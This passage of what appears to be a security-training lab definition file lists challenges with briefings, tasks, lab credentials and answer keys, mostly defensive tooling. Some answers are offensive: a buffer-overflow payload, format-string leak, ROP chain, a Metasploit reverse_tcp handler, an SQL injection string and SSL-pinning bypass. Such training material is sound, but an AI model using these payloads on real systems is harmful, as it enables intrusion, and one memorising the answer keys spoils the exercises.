4. Implement input validation using Joi or Zod schemas
5. Secure GraphQL resolvers with authorization directives
6. Prevent mass assignment with explicit field whitelisting
7. Implement API versioning with backward compatibility
8. Set up API gateway security policies

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Implement API key rotation and validation", "Set up OAuth 2.0 with JWT for API authentication", "Configure rate limiting per API key and endpoint", "Implement input validation using Joi or Zod schemas", "Secure GraphQL resolvers with authorization directives", "Prevent mass assignment with explicit field whitelisting", "Implement API versioning with backward compatibility", "Set up API gateway security policies"],
    credentials: [
      { service: "container", username: "dev", password: "api-sec-2024!"}
    ],
    flags: [
      { title: "Key Rotator", description: "Implement API key rotation", correctAnswer: "Generate new key, set 90-day expiry, deprecate old key", points: 150},
      { title: "JWT Configurer", description: "Set up JWT authentication", correctAnswer: "const jwt = require('jsonwebtoken'); app.use((req, res, next) => { const token = req.headers.authorization?.split(' ')[1]; })", points: 200},
      { title: "Rate Limiter", description: "Configure API rate limiting", correctAnswer: "const limiter = rateLimit({ windowMs: 15*60*1000, max: 100, keyGenerator: (req) => req.headers['x-api-key'] })", points: 200},
      { title: "Schema Validator", description: "Validate API input schemas", correctAnswer: "const schema = Joi.object({ name: Joi.string().required().max(50) })", points: 150},
      { title: "Mass Assignment Fixer", description: "Prevent mass assignment", correctAnswer: "const { name, email } = req.body; // Only destructure allowed fields", points: 200}
    ],
  },
  {
    title: "Static Application Security Testing (SAST)",
    description: "Integrate SAST tools into development workflow for early vulnerability detection.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1000,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Configure and run SonarQube, Semgrep, and CodeQL for comprehensive static analysis.

### Environment
- Ubuntu 22.04 with SAST tools
- Multiple code repositories
- Credentials: dev / sast-sec-2024!

### Tasks
1. Configure SonarQube for Java/Python/JavaScript analysis
2. Run Semgrep with custom rules for organization-specific patterns
3. Set up CodeQL for deep semantic analysis
4. Tune false positive rates in SAST findings
5. Create custom Semgrep rules for security patterns
6. Integrate SAST into CI/CD pipeline with quality gates
7. Remediate critical and high findings from SAST scans
8. Generate compliance reports from SAST results

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Configure SonarQube for Java/Python/JavaScript analysis", "Run Semgrep with custom rules for organization-specific patterns", "Set up CodeQL for deep semantic analysis", "Tune false positive rates in SAST findings", "Create custom Semgrep rules for security patterns", "Integrate SAST into CI/CD pipeline with quality gates", "Remediate critical and high findings from SAST scans", "Generate compliance reports from SAST results"],
    credentials: [
      { service: "container", username: "dev", password: "sast-sec-2024!"}
    ],
    flags: [
      { title: "SonarQube Scanner", description: "Run SonarQube analysis", correctAnswer: "sonar-scanner -Dsonar.projectKey=myproject -Dsonar.sources=src/ -Dsonar.host.url=http://sonarqube:9000", points: 150},
      { title: "Semgrep Runner", description: "Run Semgrep with custom rules", correctAnswer: "semgrep --config=auto --json src/", points: 150},
      { title: "CodeQL Analyzer", description: "Analyze with CodeQL", correctAnswer: "codeql database create --language=javascript --source-root=src/ ql-db", points: 200},
      { title: "Custom Rule Writer", description: "Write custom Semgrep rule", correctAnswer: "pattern: eval(...) message: Use of eval is a security risk", points: 200},
      { title: "Pipeline Integrator", description: "Integrate SAST in CI/CD", correctAnswer: "if semgrep --error --config=auto src/; then echo 'SAST passed'; else exit 1; fi", points: 150}
    ],
  },
  {
    title: "Dynamic Application Security Testing (DAST)",
    description: "Perform automated dynamic security testing of running web applications.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1050,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Configure OWASP ZAP, Nikto, and Nuclei for automated DAST scanning.

### Environment
- Ubuntu 22.04 with OWASP ZAP
- Nikto, Nuclei scanners
- Credentials: dast-admin / dast-sec-2024!

### Tasks
1. Configure OWASP ZAP for authenticated scanning
2. Set up ZAP CI/CD integration with baseline and full scans
3. Run Nikto for web server misconfiguration detection
4. Use Nuclei with community templates for vulnerability detection
5. Create custom ZAP scripts for API testing
6. Tune scan policies to reduce false positives
7. Generate DAST findings report and remediation guidance
8. Compare DAST results with SAST for comprehensive coverage

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Configure OWASP ZAP for authenticated scanning", "Set up ZAP CI/CD integration with baseline and full scans", "Run Nikto for web server misconfiguration detection", "Use Nuclei with community templates for vulnerability detection", "Create custom ZAP scripts for API testing", "Tune scan policies to reduce false positives", "Generate DAST findings report and remediation guidance", "Compare DAST results with SAST for comprehensive coverage"],
    credentials: [
      { service: "container", username: "dast-admin", password: "dast-sec-2024!"}
    ],
    flags: [
      { title: "ZAP Baseline", description: "Run ZAP baseline scan", correctAnswer: "zap-full-scan.py -t https://target.example.com -r report.html", points: 150},
      { title: "Nikto Scanner", description: "Run Nikto scan", correctAnswer: "nikto -h https://target.example.com -o nikto-report.txt", points: 150},
      { title: "Nuclei Runner", description: "Run Nuclei templates", correctAnswer: "nuclei -u https://target.example.com -t nuclei-templates/ -json", points: 200},
      { title: "Custom ZAP Script", description: "Create ZAP API test script", correctAnswer: "org.zapv2.model.HttpMessage msg = new HttpMessage(); msg.setRequestHeader('GET /api/v1/users HTTP/1.1');", points: 200},
      { title: "False Positive Tuner", description: "Tune scan for accuracy", correctAnswer: "Exclude /static/ paths, set context for authenticated areas", points: 150}
    ],
  },
  {
    title: "Software Composition Analysis (SCA)",
    description: "Identify and manage vulnerabilities in open-source dependencies.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1100,
    estimatedMinutes: 60,
    briefing: `### Mission Objective
Use Snyk, OWASP Dependency-Check, and OSV-Scanner for comprehensive dependency vulnerability management.

### Environment
- Ubuntu 22.04 with Snyk and Dep-Check
- Multiple package ecosystems
- Credentials: dev / sca-sec-2024!

### Tasks
1. Scan npm dependencies with Snyk for known vulnerabilities
2. Run OWASP Dependency-Check on Java/Maven projects
3. Use OSV-Scanner for broad ecosystem coverage
4. Analyze dependency tree for transitive vulnerability exposure
5. Implement license compliance checking for open source
6. Create automated PR checks for new vulnerable dependencies
7. Generate Software Bill of Materials (SBOM) from dependencies
8. Set up vulnerability monitoring and alerting

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Scan npm dependencies with Snyk for known vulnerabilities", "Run OWASP Dependency-Check on Java/Maven projects", "Use OSV-Scanner for broad ecosystem coverage", "Analyze dependency tree for transitive vulnerability exposure", "Implement license compliance checking for open source", "Create automated PR checks for new vulnerable dependencies", "Generate Software Bill of Materials (SBOM) from dependencies", "Set up vulnerability monitoring and alerting"],
    credentials: [
      { service: "container", username: "dev", password: "sca-sec-2024!"}
    ],
    flags: [
      { title: "Snyk Scanner", description: "Scan with Snyk", correctAnswer: "snyk test --all-projects --severity-threshold=high", points: 150},
      { title: "DepCheck Runner", description: "Run Dependency-Check", correctAnswer: "dependency-check --project MyProject --scan ./src --out .", points: 150},
      { title: "OSV Scanner", description: "Scan with OSV-Scanner", correctAnswer: "osv-scanner --lockfile package-lock.json --json", points: 150},
      { title: "License Checker", description: "Check dependency licenses", correctAnswer: "license-checker --production --csv --out licenses.csv", points: 200},
      { title: "SBOM Creator", description: "Generate dependency SBOM", correctAnswer: "syft packages . -o spdx-json > dependency-sbom.json", points: 200}
    ],
  },
  {
    title: "Secure CI/CD with GitHub Actions",
    description: "Harden GitHub Actions workflows against supply chain and injection attacks.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1150,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Implement security controls for GitHub Actions including OIDC, secret scanning, and artifact signing.

### Environment
- Ubuntu 22.04 with GitHub CLI
- GitHub Actions security tools
- Credentials: gh-admin / ghaction-sec-2024!

### Tasks
1. Audit existing workflows for injection vulnerabilities
2. Pin all third-party actions to full SHA commits
3. Implement OIDC for cloud deployment without stored secrets
4. Configure GitHub secret scanning push protection
5. Set up artifact attestation with SLSA generators
6. Implement environment protection rules for deployments
7. Configure Dependabot for automated dependency updates
8. Set up GitHub Advanced Security code scanning

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Audit existing workflows for injection vulnerabilities", "Pin all third-party actions to full SHA commits", "Implement OIDC for cloud deployment without stored secrets", "Configure GitHub secret scanning push protection", "Set up artifact attestation with SLSA generators", "Implement environment protection rules for deployments", "Configure Dependabot for automated dependency updates", "Set up GitHub Advanced Security code scanning"],
    credentials: [
      { service: "container", username: "gh-admin", password: "ghaction-sec-2024!"}
    ],
    flags: [
      { title: "Injection Auditor", description: "Audit for injection risks", correctAnswer: "grep -r '${{' .github/workflows/ | grep -v 'github.event'", points: 150},
      { title: "SHA Pinner", description: "Pin actions to SHA", correctAnswer: "uses: actions/checkout@b4ffde65f46336ab88eb53be808477a3936bae11 # v4.1.1", points: 150},
      { title: "OIDC Configurer", description: "Configure OIDC permissions", correctAnswer: "permissions: id-token: write contents: read", points: 200},
      { title: "Secret Scouter", description: "Enable secret scanning", correctAnswer: "gh api repos/{owner}/{repo}/vulnerability-alerts -X PUT", points: 150},
      { title: "Dependabot Enabler", description: "Enable Dependabot", correctAnswer: "version: 2 updates: - package-ecosystem: npm schedule: interval: daily", points: 150}
    ],
  },
  {
    title: "Threat Modeling for Development Teams",
    description: "Apply threat modeling methodologies to identify and mitigate design-level security risks.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1200,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Use STRIDE, attack trees, and threat intelligence to identify threats during software design.

### Environment
- Ubuntu 22.04 with threat modeling tools
- OWASP Threat Dragon
- Credentials: dev / threatmodel-2024!

### Tasks
1. Decompose application architecture using data flow diagrams
2. Apply STRIDE categorization to each component
3. Create attack trees for critical application functions
4. Identify trust boundaries and data flow crossing points
5. Generate threat scenarios for high-risk components
6. Map threats to OWASP Top 10 and CWE categories
7. Design mitigations for identified threats
8. Create threat model documentation for security review

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Decompose application architecture using data flow diagrams", "Apply STRIDE categorization to each component", "Create attack trees for critical application functions", "Identify trust boundaries and data flow crossing points", "Generate threat scenarios for high-risk components", "Map threats to OWASP Top 10 and CWE categories", "Design mitigations for identified threats", "Create threat model documentation for security review"],
    credentials: [
      { service: "container", username: "dev", password: "threatmodel-2024!"}
    ],
    flags: [
      { title: "DFD Creator", description: "Create data flow diagram", correctAnswer: "Map: User -> Web Server -> Database -> External API with trust boundaries", points: 200},
      { title: "STRIDE Applicator", description: "Apply STRIDE analysis", correctAnswer: "For each component: Spoofing, Tampering, Repudiation, Info Disclosure, DoS, Elevation", points: 200},
      { title: "Attack Tree Builder", description: "Build attack tree", correctAnswer: "Goal: Steal user data -> Method 1: SQL injection -> Method 2: Session hijacking", points: 200},
      { title: "Trust Boundary Mapper", description: "Map trust boundaries", correctAnswer: "Identify: Client/Server boundary, Server/DB boundary, Internal/External boundary", points: 150},
      { title: "Mitigation Designer", description: "Design threat mitigations", correctAnswer: "For XSS: Implement CSP headers + output encoding + input validation", points: 200}
    ],
  },
  {
    title: "Memory Safety & Buffer Overflow Exploitation",
    description: "Understand memory corruption vulnerabilities and implement safe coding practices.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1250,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Exploit buffer overflows, format string bugs, and implement mitigations like ASLR and DEP.

### Environment
- Ubuntu 22.04 with GCC
- GDB, pwntools for exploitation
- Credentials: root / memsafe-2024!

### Tasks
1. Exploit a stack-based buffer overflow to gain code execution
2. Bypass ASLR using information leak techniques
3. Exploit format string vulnerability to read/write memory
4. Implement Return-Oriented Programming (ROP) chain
5. Demonstrate use-after-free vulnerability exploitation
6. Compile code with stack canary protection and test bypass
7. Enable Position-Independent Executable (PIE) for ASLR
8. Apply safe coding practices to prevent memory corruption

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Exploit a stack-based buffer overflow to gain code execution", "Bypass ASLR using information leak techniques", "Exploit format string vulnerability to read/write memory", "Implement Return-Oriented Programming (ROP) chain", "Demonstrate use-after-free vulnerability exploitation", "Compile code with stack canary protection and test bypass", "Enable Position-Independent Executable (PIE) for ASLR", "Apply safe coding practices to prevent memory corruption"],
    credentials: [
      { service: "container", username: "root", password: "memsafe-2024!"}
    ],
    flags: [
      { title: "Buffer Overflower", description: "Exploit stack buffer overflow", correctAnswer: "python -c 'print A*264 + \\x40\\x11\\x40' | ./vulnerable", points: 300},
      { title: "ASLR Bypasser", description: "Bypass ASLR with leak", correctAnswer: "Leak libc base address via format string, calculate system() address", points: 300},
      { title: "Format String Attacker", description: "Exploit format string bug", correctAnswer: "printf '%08x.%08x.%08x.%08x.%08x' to leak stack values", points: 250},
      { title: "ROP Chain Builder", description: "Build ROP chain", correctAnswer: "Chain pop rdi; ret gadget -> bin/sh address -> system()", points: 300},
      { title: "Canary Protector", description: "Enable stack canaries", correctAnswer: "gcc -fstack-protector-all -o protected vulnerable.c", points: 150}
    ],
  },
  {
    title: "WebAssembly Security Analysis",
    description: "Analyze WebAssembly modules for security vulnerabilities and reverse engineering.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1300,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Reverse engineer WASM binaries, identify vulnerabilities, and implement security controls.

### Environment
- Ubuntu 22.04 with wabt tools
- WASM analysis tools
- Credentials: dev / wasm-sec-2024!

### Tasks
1. Disassemble WebAssembly module using wasm2wat
2. Identify sensitive function calls in WASM bytecode
3. Analyze memory access patterns for buffer overflow risks
4. Reverse engineer WASM crypto implementations
5. Test WASM module for integer overflow vulnerabilities
6. Implement runtime security monitoring for WASM execution
7. Verify WASM module integrity using hash verification
8. Deploy WASM sandboxing to limit module capabilities

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Disassemble WebAssembly module using wasm2wat", "Identify sensitive function calls in WASM bytecode", "Analyze memory access patterns for buffer overflow risks", "Reverse engineer WASM crypto implementations", "Test WASM module for integer overflow vulnerabilities", "Implement runtime security monitoring for WASM execution", "Verify WASM module integrity using hash verification", "Deploy WASM sandboxing to limit module capabilities"],
    credentials: [
      { service: "container", username: "dev", password: "wasm-sec-2024!"}
    ],
    flags: [
      { title: "Disassembler", description: "Disassemble WASM module", correctAnswer: "wasm2wat module.wasm -o module.wat", points: 150},
      { title: "Function Analyzer", description: "Analyze function calls", correctAnswer: "grep -E 'call (env\\.)?(crypto|eval|exec)' module.wat", points: 200},
      { title: "Memory Analyzer", description: "Analyze memory access", correctAnswer: "grep -E 'i32\\.load|i32\\.store' module.wat | head -20", points: 200},
      { title: "Crypto Analyzer", description: "Analyze crypto implementation", correctAnswer: "Identify S-box, key schedule, and round function patterns in WASM", points: 250},
      { title: "Integrity Verifier", description: "Verify WASM integrity", correctAnswer: "sha256sum module.wasm && compare with known-good hash", points: 150}
    ],
  },
  {
    title: "Secure Microservices Architecture",
    description: "Design and implement security controls for microservices-based applications.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1350,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Implement service-to-service authentication, API gateways, and distributed security policies.

### Environment
- Ubuntu 22.04 with microservices framework
- Docker Compose for service mesh
- Credentials: dev / micro-sec-2024!

### Tasks
1. Implement mutual TLS between microservices
2. Deploy API gateway with centralized authentication
3. Create service-to-service authorization policies
4. Implement distributed tracing for security monitoring
5. Secure inter-service communication with JWT propagation
6. Configure circuit breaker patterns to prevent cascade failures
7. Implement secrets injection from Vault for microservices
8. Deploy centralized logging for audit trail

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Implement mutual TLS between microservices", "Deploy API gateway with centralized authentication", "Create service-to-service authorization policies", "Implement distributed tracing for security monitoring", "Secure inter-service communication with JWT propagation", "Configure circuit breaker patterns to prevent cascade failures", "Implement secrets injection from Vault for microservices", "Deploy centralized logging for audit trail"],
    credentials: [
      { service: "container", username: "dev", password: "micro-sec-2024!"}
    ],
    flags: [
      { title: "mTLS Implementer", description: "Implement service mTLS", correctAnswer: "Generate per-service certificates, configure mTLS in service mesh", points: 250},
      { title: "Gateway Deployer", description: "Deploy API gateway", correctAnswer: "Configure Kong/Traefik with JWT validation and rate limiting", points: 200},
      { title: "Auth Policy Creator", description: "Create service auth policies", correctAnswer: "if (caller.service != 'payment-service') { deny(); }", points: 200},
      { title: "Tracing Configurer", description: "Implement distributed tracing", correctAnswer: "OpenTelemetry collector with trace context propagation", points: 200},
      { title: "Vault Injector", description: "Inject secrets from Vault", correctAnswer: "Sidecar container fetches secrets from Vault and writes to shared volume", points: 200}
    ],
  },
  {
    title: "Fuzzing & Property-Based Testing for Security",
    description: "Discover security vulnerabilities using automated fuzzing techniques.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1400,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Use AFL++, libFuzzer, and Hypothesis for finding memory bugs and logic vulnerabilities.

### Environment
- Ubuntu 22.04 with AFL++ and libFuzzer
- Hypothesis for property-based testing
- Credentials: dev / fuzz-sec-2024!

### Tasks
1. Set up AFL++ fuzzing harness for C/C++ target
2. Fuzz a file parser to find buffer overflow crashes
3. Use libFuzzer for coverage-guided fuzzing of a network service
4. Implement dictionary-based fuzzing for protocol testing
5. Fuzz a JSON parser with Hypothesis property-based testing
6. Minimize crash inputs using AFL minimizer
7. Reproduce and analyze discovered crashes
8. Implement continuous fuzzing in CI/CD pipeline

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Set up AFL++ fuzzing harness for C/C++ target", "Fuzz a file parser to find buffer overflow crashes", "Use libFuzzer for coverage-guided fuzzing of a network service", "Implement dictionary-based fuzzing for protocol testing", "Fuzz a JSON parser with Hypothesis property-based testing", "Minimize crash inputs using AFL minimizer", "Reproduce and analyze discovered crashes", "Implement continuous fuzzing in CI/CD pipeline"],
    credentials: [
      { service: "container", username: "dev", password: "fuzz-sec-2024!"}
    ],
    flags: [
      { title: "AFL Fuzzer", description: "Fuzz with AFL++", correctAnswer: "afl-fuzz -i seeds/ -o findings/ ./target @@", points: 200},
      { title: "LibFuzzer Runner", description: "Fuzz with libFuzzer", correctAnswer: "clang -fsanitize=fuzzer,address target.c && ./a.out corpus/", points: 200},
      { title: "Hypothesis Tester", description: "Property-based testing", correctAnswer: "@given(data=st.text()) def test_parse(data): parse(data)", points: 200},
      { title: "Crash Minimizer", description: "Minimize crash input", correctAnswer: "afl-tmin -i crash_input -o minimized -- ./target @@", points: 200},
      { title: "CI Fuzzer", description: "Continuous fuzzing in CI", correctAnswer: "afl-fuzz -V 3600 -i seeds/ -o findings/ ./target @@", points: 200}
    ],
  },
  {
    title: "Secure Logging, Monitoring & Incident Response",
    description: "Implement security logging, monitoring, and incident response procedures.",
    dockerImage: "ubuntu:22.04",
    difficulty: 1500,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Deploy ELK stack for security monitoring, create alert rules, and practice incident response.

### Environment
- Ubuntu 22.04 with Elasticsearch, Logstash, Kibana
- Wazuh for SIEM
- Credentials: soc-admin / logging-sec-2024!

### Tasks
1. Deploy ELK stack for centralized security logging
2. Configure Filebeat for log collection from multiple sources
3. Create Kibana dashboards for security event visualization
4. Implement Wazuh rules for intrusion detection alerts
5. Set up alerting for brute-force attempts and privilege escalation
6. Create incident response playbooks for common scenarios
7. Practice tabletop exercises for security incident handling
8. Implement log retention and compliance archiving

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Deploy ELK stack for centralized security logging", "Configure Filebeat for log collection from multiple sources", "Create Kibana dashboards for security event visualization", "Implement Wazuh rules for intrusion detection alerts", "Set up alerting for brute-force attempts and privilege escalation", "Create incident response playbooks for common scenarios", "Practice tabletop exercises for security incident handling", "Implement log retention and compliance archiving"],
    credentials: [
      { service: "container", username: "soc-admin", password: "logging-sec-2024!"}
    ],
    flags: [
      { title: "ELK Deployer", description: "Deploy ELK stack", correctAnswer: "docker-compose up -d elasticsearch logstash kibana", points: 150},
      { title: "Filebeat Configurer", description: "Configure Filebeat", correctAnswer: "filebeat.inputs: - type: log paths: ['/var/log/auth.log']", points: 150},
      { title: "Kibana Dashboard", description: "Create security dashboard", correctAnswer: "Visualize: failed logins per hour, top attackers, geo map", points: 200},
      { title: "Wazuh Rule Creator", description: "Create detection rules", correctAnswer: "<rule id='100101' level='10'><decoded_as>sshd</decoded_as><field name='sshd.invalid_user'>yes</field></rule>", points: 200},
      { title: "Incident Playbook", description: "Create IR playbook", correctAnswer: "1. Detect 2. Triage 3. Contain 4. Eradicate 5. Recover 6. Lessons learned", points: 200}
    ],
  },
  {
    title: "Penetration Testing Methodology (PTES)",
    description: "Follow PTES methodology for comprehensive security assessments.",
    dockerImage: "parrotsec/security",
    difficulty: 800,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Execute a full penetration test following PTES phases from information gathering to reporting.

### Environment
- Parrot Security OS with pentesting tools
- Vulnerable test environment
- Credentials: pentester / ptes-sec-2024!

### Tasks
1. Conduct pre-engagement and scope definition
2. Perform passive and active information gathering
3. Identify vulnerabilities through automated and manual scanning
4. Exploit discovered vulnerabilities for proof of concept
5. Perform post-exploitation analysis and lateral movement
6. Document all findings with evidence and risk ratings
7. Create executive summary and technical report
8. Present findings and remediation recommendations

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Conduct pre-engagement and scope definition", "Perform passive and active information gathering", "Identify vulnerabilities through automated and manual scanning", "Exploit discovered vulnerabilities for proof of concept", "Perform post-exploitation analysis and lateral movement", "Document all findings with evidence and risk ratings", "Create executive summary and technical report", "Present findings and remediation recommendations"],
    credentials: [
      { service: "ssh", username: "pentester", password: "ptes-sec-2024!"}
    ],
    flags: [
      { title: "Info Gatherer", description: "Passive information gathering", correctAnswer: "theHarvester -d target.com -b google,linkedin,github", points: 150},
      { title: "Vuln Scanner", description: "Vulnerability scanning", correctAnswer: "nmap --script vuln -sV target.com", points: 200},
      { title: "Exploiter", description: "Exploit vulnerability", correctAnswer: "msfconsole -x 'use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp'", points: 250},
      { title: "Lateral Mover", description: "Perform lateral movement", correctAnswer: "Crack hash -> use credential -> pivot to next host", points: 200},
      { title: "Report Writer", description: "Write penetration test report", correctAnswer: "Executive summary, methodology, findings with CVSS, remediation timeline", points: 200}
    ],
  },
  {
    title: "Security Test Automation Framework",
    description: "Build automated security testing frameworks for continuous validation.",
    dockerImage: "ubuntu:22.04",
    difficulty: 850,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Create automated security test suites using pytest, Selenium, and security scanning APIs.

### Environment
- Ubuntu 22.04 with Python and Selenium
- Security testing APIs
- Credentials: qa-dev / autotest-sec-2024!

### Tasks
1. Create pytest test cases for OWASP Top 10 vulnerabilities
2. Implement automated SAST scanning in test pipeline
3. Build Selenium scripts for authentication security testing
4. Integrate DAST API calls into automated test suite
5. Create regression tests for previously fixed vulnerabilities
6. Implement security assertions for API responses
7. Set up test data management for security testing
8. Generate automated security test reports

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Create pytest test cases for OWASP Top 10 vulnerabilities", "Implement automated SAST scanning in test pipeline", "Build Selenium scripts for authentication security testing", "Integrate DAST API calls into automated test suite", "Create regression tests for previously fixed vulnerabilities", "Implement security assertions for API responses", "Set up test data management for security testing", "Generate automated security test reports"],
    credentials: [
      { service: "container", username: "qa-dev", password: "autotest-sec-2024!"}
    ],
    flags: [
      { title: "Pytest Creator", description: "Create security test cases", correctAnswer: "def test_sqli_protection(): response = client.get('/search?q=<script>') assert '<script>' not in response.text", points: 200},
      { title: "SAST Integrator", description: "Integrate SAST in tests", correctAnswer: "subprocess.run(['bandit', '-r', 'src/', '-f', 'json'], check=True)", points: 150},
      { title: "Selenium Tester", description: "Automated auth testing", correctAnswer: "driver.find_element(By.ID, 'username').send_keys('admin\\' OR 1=1--')", points: 200},
      { title: "DAST Caller", description: "Integrate DAST API", correctAnswer: "requests.post('http://zap:8080/JSON/ascan/action/scan/', json={'url': target})", points: 200},
      { title: "Regression Runner", description: "Run regression tests", correctAnswer: "pytest tests/security/ --html=report.html --self-contained-html", points: 150}
    ],
  },
  {
    title: "Vulnerability Assessment & Risk Rating",
    description: "Conduct systematic vulnerability assessments and calculate risk ratings.",
    dockerImage: "ubuntu:22.04",
    difficulty: 900,
    estimatedMinutes: 75,
    briefing: `### Mission Objective
Use CVSS scoring, risk matrices, and prioritization frameworks for vulnerability management.

### Environment
- Ubuntu 22.04 with CVSS calculator
- OpenVAS, Nessus
- Credentials: vuln-admin / var-sec-2024!

### Tasks
1. Perform network vulnerability scan with OpenVAS
2. Analyze findings and calculate CVSS v3.1 base scores
3. Apply environmental metrics for organizational context
4. Create risk matrix comparing likelihood vs impact
5. Prioritize vulnerabilities using exploitability metrics
6. Map vulnerabilities to MITRE ATT&CK techniques
7. Generate vulnerability assessment report with timelines
8. Create remediation tracking dashboard

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Perform network vulnerability scan with OpenVAS", "Analyze findings and calculate CVSS v3.1 base scores", "Apply environmental metrics for organizational context", "Create risk matrix comparing likelihood vs impact", "Prioritize vulnerabilities using exploitability metrics", "Map vulnerabilities to MITRE ATT&CK techniques", "Generate vulnerability assessment report with timelines", "Create remediation tracking dashboard"],
    credentials: [
      { service: "container", username: "vuln-admin", password: "var-sec-2024!"}
    ],
    flags: [
      { title: "OpenVAS Scanner", description: "Run OpenVAS scan", correctAnswer: "gvm-cli socket --xml '<create_target><name>Target</name><hosts>192.168.1.0/24</hosts></create_target>'", points: 150},
      { title: "CVSS Calculator", description: "Calculate CVSS score", correctAnswer: "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H = 9.8 Critical", points: 200},
      { title: "Risk Matrix Creator", description: "Create risk matrix", correctAnswer: "Plot each vulnerability on 5x5 matrix: Likelihood (1-5) vs Impact (1-5)", points: 200},
      { title: "ATT&CK Mapper", description: "Map to MITRE ATT&CK", correctAnswer: "SQL Injection -> T1190 (Exploit Public-Facing Application)", points: 200},
      { title: "Dashboard Builder", description: "Create tracking dashboard", correctAnswer: "Grafana dashboard: open vulns by severity, mean time to remediate, trend over time", points: 150}
    ],
  },
  {
    title: "Mobile Application Security Testing",
    description: "Test Android and iOS applications for security vulnerabilities.",
    dockerImage: "parrotsec/security",
    difficulty: 950,
    estimatedMinutes: 90,
    briefing: `### Mission Objective
Perform static and dynamic analysis of mobile apps using MobSF, Frida, and objection.

### Environment
- Parrot Security OS with MobSF
- Frida, objection for runtime testing
- Credentials: mobile-test / mobsec-2024!

### Tasks
1. Set up MobSF for automated mobile app analysis
2. Decompile APK and analyze for hardcoded secrets
3. Perform dynamic analysis using Frida runtime instrumentation
4. Test for insecure data storage on device
5. Bypass SSL pinning using Frida scripts
6. Exploit deep link vulnerabilities for app compromise
7. Test API backend for mobile-specific vulnerabilities
8. Create mobile security assessment report

### Permissions & Access
- Container runs as root
- Flag files owned by root:root with 644 permissions
- Working directories use 755 for shared, 700 for private
- Verify permissions with: stat -c '%U:%G %a' [path]`,
    tasks: ["Set up MobSF for automated mobile app analysis", "Decompile APK and analyze for hardcoded secrets", "Perform dynamic analysis using Frida runtime instrumentation", "Test for insecure data storage on device", "Bypass SSL pinning using Frida scripts", "Exploit deep link vulnerabilities for app compromise", "Test API backend for mobile-specific vulnerabilities", "Create mobile security assessment report"],
    credentials: [
      { service: "container", username: "mobile-test", password: "mobsec-2024!"}
    ],
    flags: [
      { title: "MobSF Scanner", description: "Scan APK with MobSF", correctAnswer: "python3 manage.py runserver 8000 && upload APK via API", points: 150},
      { title: "APK Decompiler", description: "Decompile APK", correctAnswer: "apktool d target.apk && grep -r 'API_KEY' target/smali/", points: 200},
      { title: "Frida Injector", description: "Inject Frida script", correctAnswer: "frida -U -l bypass_ssl.js com.target.app", points: 250},
      { title: "SSL Pinning Bypasser", description: "Bypass SSL pinning", correctAnswer: "objection --gadget --host 127.0.0.1 --port 8080 explore", points: 200},
      { title: "Deep Link Tester", description: "Test deep link vulnerabilities", correctAnswer: "adb shell am start -a android.intent.action.VIEW -d 'myapp://admin?role=admin'", points: 200}
    ],
  },
  {
    title: "Cloud Penetration Testing (AWS/Azure/GCP)",
